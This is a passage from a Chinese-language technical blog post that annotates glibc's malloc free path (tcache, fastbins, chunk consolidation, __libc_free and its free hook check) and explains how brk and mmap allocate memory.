-------------------------------------------</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">	tcache_put (p, tc_idx);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">    满足tcache的条件则放入tcache，tcache有位置。</span><br><span class="line">    ------------------------------------------------------------------</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">	bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))</span><br><span class="line">			  &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="keyword">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">	   getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (!have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    __libc_lock_lock (av-&gt;mutex);</span><br><span class="line">	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">	    __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fail)</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">---------------------------------</span><br><span class="line">    如果当前<span class="built_in">free</span>的chunk属于fastbins 查看下一个相邻的chunk的大小是否小于等于<span class="number">2</span>*size_sz，下一个相邻chunk的大小是否大于分配区所分配的内存总量，如果是则报错。</span><br><span class="line">    --------------------------------------------</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">    设置当权分配区的fastbiflag  表示当前分配区的fastbin中已有空闲chuank，然后根据当前<span class="built_in">free</span>的chunk大小获取所属的fastbin</span><br><span class="line">    ----------------------------------------------------------------</span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	   add (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">	p-&gt;fd = old;</span><br><span class="line">	*fb = p;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">	     add (i.e., double free).  */</span></span><br><span class="line">	  <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;double free or corruption (fasttop)&quot;</span>);</span><br><span class="line">	  p-&gt;fd = old2 = old;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))</span><br><span class="line">	     != old2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">       size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">       only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">       allocated again.  */</span></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">	&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;invalid fastbin entry (free)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If we&#x27;re single-threaded, don&#x27;t lock the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">      have_lock = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_lock (av-&gt;mutex);</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">			  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">			  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): invalid next size (normal)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">	Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">	not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">	been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">	    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">	  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">	   large, because the corresponding heap might go away.  */</span></span><br><span class="line">	heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">	assert(heap-&gt;ar_ptr == av);</span><br><span class="line">	heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="linux进程分配内存的两种方式brk-mmap"><a href="#linux进程分配内存的两种方式brk-mmap" class="headerlink" title="linux进程分配内存的两种方式brk(),mmap()"></a>linux进程分配内存的两种方式brk(),mmap()</h2><blockquote>
<p>两者分配的都是虚拟内存。</p>
<p>brk将数据段的最高地址指针_edata往高地址推</p>
<p>mmap是在进程的虚拟地址空间中（堆和栈的中间，也就是文件映射区域）找一块空闲的虚拟内存。</p>
</blockquote>
<h3 id="情况一、malloc小于128k的内存"><a href="#情况一、malloc小于128k的内存" class="headerlink" title="情况一、malloc小于128k的内存"></a>情况一、malloc小于128k的内存</h3><p>使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：</p>
<p><img src="https://img-blog.csdn.net/20130625110751828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>1、进程启动的时候，其（虚拟）内存空间的初始布局如图1所示。</strong><br>   其中，mmap内存映射文件是在堆和栈的中间（例如libc-2.2.93.so，其它数据文件等），为了简单起见，省略了内存映射文件。<br>   _edata指针（glibc里面定义）指向数据段的最高地址。<br><strong>2、进程调用A=malloc(30K)以后，内存空间如图2：</strong><br>   malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。<br>   你可能会问：只要把_edata+30K就完成内存分配了？<br>   事实是这样的，_edata+30K只是完成虚拟地址的分配，A这块内存现在还是没有物理页与之对应的，等到进程第一次读写A这块内存的时候，发生缺页中断，这个时候，内核才分配A这块内存对应的物理页。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。<br><strong>3、进程调用B=malloc(40K)以后，内存空间如图3。</strong></p>
<h3 id="情况二、malloc大于128k的内存"><a href="#情况二、malloc大于128k的内存" class="headerlink" title="情况二、malloc大于128k的内存"></a>情况二、malloc大于128k的内存</h3><p>使用mmap分配内存，在堆和栈之间找一块空闲内存分配(对应独立内存，而且初始化为0)，如下图：</p>
<p><img src="https://img-blog.csdn.net/20130625110817750?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>4、进程调用C=malloc(200K)以后，内存空间如图4：</strong></p>
<p>   默认情况下，malloc函数分配内存，如果请求内存大于128K（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</p>
<p>   这样子做主要是因为:</p>
<p>   brk分配的内存需要等到高地址内存释放以后才能释放（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。</p>
<p>   当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。<br><strong>5、进程调用D=malloc(100K)以后，内存空间如图5；</strong><br><strong>6、进程调用free(C)以后，C对应的虚拟内存和物理内存一起释放。</strong></p>
<p><img src="https://img-blog.csdn.net/20130625110835437?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center"></p>
<p><strong>7、进程调用free(B)以后，如图7所示：</strong><br>​    <code>B对应的虚拟内存和物理内存都没有释放</code>，因为只有一个_edata指针，如果往回推，那么D这块内存怎么办呢？<br>当然，<code>B这块内存，是可以重用的，</code>如果这个时候再来一个40K的请求，那么malloc很可能就把B这块内存返回回去了。<br><strong>8、进程调用free(D)以后，如图8所示：</strong><br>​    B和D连接起来，变成一块140K的空闲内存。<br><strong>9、默认情况下：</strong><br>​    当最高地址空间的空闲内存超过128K（可由M_TRIM_THRESHOLD选项调节）时，执行内存紧缩操作（trim）。在上一个步骤free的时候，发现最高地址空闲内存超过128K，于是内存紧缩，变成图9所示。</p>
<h2 id="libc-free-、int-free"><a href="#libc-free-、int-free" class="headerlink" title="libc_free()、int_free()"></a>libc_free()、int_free()</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/crybaby/p/12940235.html">https://www.cnblogs.com/crybaby/p/12940235.html</a>   int_free()</p>
<p><a target="_blank" rel="noopener" href="https://dongshao.blog.csdn.net/article/details/99071778">https://dongshao.blog.csdn.net/article/details/99071778</a>   libc_free() free hook  </p>
<h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="libc_free():"></a>libc_free():</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)<span class="comment">//mem是之前malloc后返回给用户的指针</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)<span class="comment">//读取free_hook全局变量，返回一个函数指针</span></span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))<span class="comment">//与malloc类似，用内置函数判断hook函数指针是否为空，不为空则执行hook函数，然后返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> conversion from malloc headers to user pointers, and back </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">去除头(header)和加上头的地址</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">低地址----------------- chunk分配的大小</span></span><br><span class="line"><span class="comment">高地址-----------------  mem返回给用户的大小</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* 如果是mmap的堆块，调用munmap进行释放*/</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span></span><br><span class="line"><span class="comment">	 Dumped fake mmapped chunks do not affect the threshold.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX</span><br><span class="line">	  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);<span class="comment">//获取arena</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);<span class="comment">//释放</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其主要内容：</p>
<ul>
<li><blockquote>
<p>①检查是否有__free_hook</p>
</blockquote>
</li>
<li><blockquote>
<p>②如果堆块为NULL，则什么都不做</p>
</blockquote>
</li>
<li><blockquote>
<p>③如果是mmap的堆块，调用munmap进行释放</p>
</blockquote>
</li>
<li><blockquote>
<p>④否则最后调用_int_free函数释放堆块</p>
</blockquote>
</li>
</ul>
<p>int free流程;</p>
<p>先判断是否大小在tcachebin中，tcache是否有位置，有则放入tcachebin中。</p>
<p>其次怕段是否是fastbin，是则插入fastbin</p>
<p>如果不是mmapchunk判断nextchunk是否为空闲，是则合并,查看iuse位（<strong>top chunk除外</strong>），将合并后的chunk插入unsorted bin中</p>
<p><strong>如果和topchunk相邻则并入topchunk。</strong></p>
<p>不相邻不是fatbin、tcachebin，直接进入垃圾桶unsorted bin中。</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/07/18/iot1/" rel="prev" title="iot1">
                  <i class="fa fa-chevron-left"></i> iot1
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/10/09/xv61/" rel="next" title="xv61">
                  xv61 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>







<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">eetan</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
